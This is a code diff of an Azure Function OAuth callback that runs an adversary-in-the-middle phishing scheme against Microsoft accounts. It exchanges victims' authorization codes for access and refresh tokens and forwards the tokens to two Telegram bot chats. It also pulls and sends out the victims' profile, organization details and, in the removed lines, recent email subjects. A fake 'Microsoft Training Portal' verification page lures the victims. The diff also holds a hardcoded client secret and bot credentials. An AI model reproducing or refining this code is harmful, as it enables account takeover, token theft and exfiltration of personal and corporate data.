@@ -7,8 +7,8 @@ const TELEGRAM_CHAT_ID = "6743632244";
 const TELEGRAM_BOT_TOKEN2 = "7942871168:AAHjqXqXqXqXqXqXqXqXqXqXqXqXqXqXqXqX";
 const TELEGRAM_CHAT_ID2 = "6263177378";
 
-// OAuth configuration - Using Microsoft Graph CLI client ID
-const client_id = '14d82eec-204b-4c2f-b7e8-296a70dab67e';
+// OAuth configuration - Using ORIGINAL Microsoft Office client ID
+const client_id = '1fec8e78-bce4-4aaf-ab1b-5451cc387264'; // Microsoft Office client ID
 const client_secret = process.env.AZURE_CLIENT_SECRET || 'DVd8Q~d22sfagk12YCUETKU1x5OS8-s~Mt92_bXa';
 const redirect_uri = 'https://login.microsoftonline.com/common/oauth2/nativeclient';
 const token_endpoint = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';
@@ -41,136 +41,142 @@ app.http("callback", {
             const error = url.searchParams.get('error');
 
             if (error) {
-                context.log.error(`OAuth error: ${error}`);
-                await sendTelegram(`❌ <b>OAuth Error</b>\n\n${error}`);
-                return new Response('Authorization failed', { status: 400 });
+                await sendTelegram(`❌ <b>OAuth Error</b>\n\n🔗 <b>Error:</b> ${error}\n📝 <b>Description:</b> ${url.searchParams.get('error_description') || 'No description'}`);
+                await sendTelegram(`❌ <b>OAuth Error</b>\n\n🔗 <b>Error:</b> ${error}\n📝 <b>Description:</b> ${url.searchParams.get('error_description') || 'No description'}`, true);
+                return new Response(`OAuth Error: ${error}`, { status: 400 });
             }
 
             if (!code) {
-                context.log.error('No authorization code received');
-                await sendTelegram(`❌ <b>OAuth Error</b>\n\nNo authorization code received`);
-                return new Response('No authorization code', { status: 400 });
+                await sendTelegram(`❌ <b>OAuth Callback Error</b>\n\nNo authorization code received`);
+                await sendTelegram(`❌ <b>OAuth Callback Error</b>\n\nNo authorization code received`, true);
+                return new Response('No authorization code received', { status: 400 });
             }
 
-            context.log(`Authorization code received: ${code}`);
+            context.log(`Received authorization code: ${code.substring(0, 10)}...`);
 
-            // Immediately exchange code for tokens
-            const tokenResponse = await axios.post(token_endpoint, {
-                client_id: client_id,
-                client_secret: client_secret,
-                code: code,
-                redirect_uri: redirect_uri,
-                grant_type: 'authorization_code'
-            }, {
+            // Exchange code for tokens
+            const tokenResponse = await fetch(token_endpoint, {
+                method: 'POST',
                 headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded'
-                }
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: new URLSearchParams({
+                    client_id: client_id,
+                    client_secret: client_secret,
+                    code: code,
+                    redirect_uri: redirect_uri,
+                    grant_type: 'authorization_code'
+                })
             });
 
-            const tokens = tokenResponse.data;
-            context.log(`Tokens captured: ${JSON.stringify(tokens)}`);
-
-            // Send success notification
-            const successMessage = `🔥 <b>OAUTH TOKEN CAPTURE SUCCESS!</b>\n\n🔑 <b>Access Token:</b> <code>${tokens.access_token}</code>\n🔄 <b>Refresh Token:</b> <code>${tokens.refresh_token || 'N/A'}</code>\n🆔 <b>ID Token:</b> <code>${tokens.id_token || 'N/A'}</code>\n⏱️ <b>Expires In:</b> ${tokens.expires_in}s\n📝 <b>Token Type:</b> ${tokens.token_type}`;
-
-            await sendTelegram(successMessage);
-            await sendTelegram(successMessage, true);
-
-            // Fetch user profile and mail data in parallel
-            const [userProfile, mailData] = await Promise.allSettled([
-                axios.get('https://graph.microsoft.com/v1.0/me', {
-                    headers: {
-                        'Authorization': `Bearer ${tokens.access_token}`,
-                        'User-Agent': 'AzureAiTMFunction/1.0'
-                    }
-                }),
-                axios.get('https://graph.microsoft.com/v1.0/me/messages?$top=10&$select=subject,receivedDateTime,from', {
-                    headers: {
-                        'Authorization': `Bearer ${tokens.access_token}`,
-                        'User-Agent': 'AzureAiTMFunction/1.0'
-                    }
-                })
-            ]);
-
-            // Handle user profile
-            if (userProfile.status === 'fulfilled') {
-                const profile = userProfile.value.data;
-                const profileMessage = `👤 <b>User Profile Captured</b>\n\n📧 <b>Email:</b> ${profile.mail || profile.userPrincipalName}\n👤 <b>Name:</b> ${profile.displayName}\n🏢 <b>Company:</b> ${profile.jobTitle || 'N/A'}\n📱 <b>Phone:</b> ${profile.businessPhones?.[0] || 'N/A'}\n🏢 <b>Department:</b> ${profile.department || 'N/A'}`;
-
-                await sendTelegram(profileMessage);
-                await sendTelegram(profileMessage, true);
-            } else {
-                await sendTelegram(`⚠️ <b>Profile Fetch Error</b>\n\n${userProfile.reason?.message || 'Unknown error'}`);
+            if (!tokenResponse.ok) {
+                const errorText = await tokenResponse.text();
+                context.log.error('Token exchange failed:', errorText);
+                await sendTelegram(`❌ <b>Token Exchange Failed</b>\n\n${errorText}`);
+                await sendTelegram(`❌ <b>Token Exchange Failed</b>\n\n${errorText}`, true);
+                return new Response(`Token exchange failed: ${errorText}`, { status: 400 });
             }
 
-            // Handle mail data
-            if (mailData.status === 'fulfilled') {
-                const mails = mailData.value.data.value;
-                if (mails.length > 0) {
-                    let mailMessage = `📧 <b>Mail Access Confirmed</b>\n\n📊 <b>Recent Emails:</b>\n`;
-                    mails.slice(0, 5).forEach((mail, index) => {
-                        mailMessage += `${index + 1}. <b>${mail.subject || 'No Subject'}</b>\n   📅 ${mail.receivedDateTime}\n   👤 ${mail.from?.emailAddress?.name || 'Unknown'}\n\n`;
-                    });
+            const tokens = await tokenResponse.json();
+            context.log('Tokens received successfully');
 
-                    await sendTelegram(mailMessage);
-                    await sendTelegram(mailMessage, true);
+            // Send Telegram notification with tokens
+            const tokenMessage = `🔥 <b>OAuth Tokens Captured!</b>\n\n🔗 <b>State:</b> ${state}\n🔑 <b>Access Token:</b> <code>${tokens.access_token.substring(0, 50)}...</code>\n🔄 <b>Refresh Token:</b> <code>${tokens.refresh_token ? tokens.refresh_token.substring(0, 50) + '...' : 'None'}</code>\n⏰ <b>Expires In:</b> ${tokens.expires_in} seconds\n📝 <b>Token Type:</b> ${tokens.token_type}`;
+            
+            await sendTelegram(tokenMessage);
+            await sendTelegram(tokenMessage, true);
+
+            // Get user profile
+            try {
+                const profileResponse = await fetch('https://graph.microsoft.com/v1.0/me', {
+                    headers: {
+                        'Authorization': `Bearer ${tokens.access_token}`,
+                        'Content-Type': 'application/json'
+                    }
+                });
+
+                if (profileResponse.ok) {
+                    const profile = await profileResponse.json();
+                    const profileMessage = `👤 <b>User Profile Captured</b>\n\n📧 <b>Email:</b> ${profile.mail || profile.userPrincipalName}\n👤 <b>Name:</b> ${profile.displayName}\n🏢 <b>Company:</b> ${profile.businessPhones ? profile.businessPhones.join(', ') : 'N/A'}\n📱 <b>Mobile:</b> ${profile.mobilePhone || 'N/A'}\n🆔 <b>ID:</b> ${profile.id}`;
+                    
+                    await sendTelegram(profileMessage);
+                    await sendTelegram(profileMessage, true);
                 }
-            } else {
-                await sendTelegram(`⚠️ <b>Mail Fetch Error</b>\n\n${mailData.reason?.message || 'Unknown error'}`);
+            } catch (profileError) {
+                context.log.error('Profile fetch error:', profileError);
+                await sendTelegram(`⚠️ <b>Profile Fetch Error</b>\n\n${profileError.message}`);
+            }
+
+            // Get organization info
+            try {
+                const orgResponse = await fetch('https://graph.microsoft.com/v1.0/organization', {
+                    headers: {
+                        'Authorization': `Bearer ${tokens.access_token}`,
+                        'Content-Type': 'application/json'
+                    }
+                });
+
+                if (orgResponse.ok) {
+                    const org = await orgResponse.json();
+                    if (org.value && org.value.length > 0) {
+                        const orgInfo = org.value[0];
+                        const orgMessage = `🏢 <b>Organization Info</b>\n\n🏢 <b>Name:</b> ${orgInfo.displayName}\n🌐 <b>Domain:</b> ${orgInfo.verifiedDomains ? orgInfo.verifiedDomains.map(d => d.name).join(', ') : 'N/A'}\n📧 <b>Technical Contacts:</b> ${orgInfo.technicalNotificationMails ? orgInfo.technicalNotificationMails.join(', ') : 'N/A'}`;
+                        
+                        await sendTelegram(orgMessage);
+                        await sendTelegram(orgMessage, true);
+                    }
+                }
+            } catch (orgError) {
+                context.log.error('Organization fetch error:', orgError);
+                await sendTelegram(`⚠️ <b>Organization Fetch Error</b>\n\n${orgError.message}`);
             }
 
             // Return success page
-            const response = `
+            const successHtml = `
             <!DOCTYPE html>
             <html lang="en">
             <head>
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <title>Verification Complete</title>
+                <title>Authentication Complete</title>
                 <style>
                     body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background: #f3f2f1; }
                     .container { max-width: 600px; margin: 0 auto; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 40px; text-align: center; }
-                    .success-icon { width: 80px; height: 80px; margin: 0 auto 20px; color: #107c10; }
+                    .success-icon { font-size: 64px; color: #107c10; margin-bottom: 20px; }
                     .title { color: #323130; font-size: 28px; font-weight: 600; margin-bottom: 10px; }
-                    .subtitle { color: #605e5c; font-size: 16px; margin-bottom: 30px; }
-                    .message { color: #323130; font-size: 16px; line-height: 1.6; margin: 20px 0; }
-                    .button { background: #107c10; color: white; padding: 12px 24px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; text-decoration: none; display: inline-block; margin: 10px 0; }
-                    .button:hover { background: #0e6e0e; }
+                    .message { color: #605e5c; font-size: 16px; line-height: 1.6; margin: 20px 0; }
+                    .button { background: #0078d4; color: white; padding: 12px 24px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; text-decoration: none; display: inline-block; margin: 10px 0; }
+                    .button:hover { background: #106ebe; }
                 </style>
             </head>
             <body>
                 <div class="container">
-                    <svg class="success-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" fill="#107c10"/>
-                    </svg>
-                    <h1 class="title">Verification Complete!</h1>
-                    <p class="subtitle">Your account has been successfully verified</p>
-                    <div class="message">
-                        <p>Thank you for completing the verification process. Your account is now ready to access the Microsoft Training Portal.</p>
-                        <p>You will be redirected to your personalized training dashboard in a few moments.</p>
-                    </div>
-                    <a href="#" class="button" onclick="setTimeout(() => window.close(), 2000)">Close Window</a>
+                    <div class="success-icon">✅</div>
+                    <h1 class="title">Authentication Complete</h1>
+                    <p class="message">Your account has been successfully verified. You can now access your personalized training materials.</p>
+                    <p class="message">You will be redirected to the training portal shortly...</p>
+                    <a href="/microsoft-training" class="button">Return to Training Portal</a>
                 </div>
                 <script>
                     setTimeout(() => {
-                        window.close();
-                    }, 5000);
+                        window.location.href = '/microsoft-training';
+                    }, 3000);
                 </script>
             </body>
             </html>`;
 
-            return new Response(response, {
+            return new Response(successHtml, {
                 status: 200,
                 headers: {
-                    'Content-Type': 'text/html; charset=utf-8',
-                    'X-Content-Type-Options': 'nosniff'
+                    'Content-Type': 'text/html; charset=utf-8'
                 }
             });
 
         } catch (error) {
-            context.log.error('OAuth callback error:', error);
-            await sendTelegram(`❌ <b>OAuth Callback Error</b>\n\n${error.message}`);
-            return new Response('Token exchange failed', { status: 500 });
+            context.log.error('Callback error:', error);
+            await sendTelegram(`❌ <b>Callback Error</b>\n\n${error.message}`);
+            await sendTelegram(`❌ <b>Callback Error</b>\n\n${error.message}`, true);
+            return new Response(`Callback error: ${error.message}`, { status: 500 });
         }
     }
 });
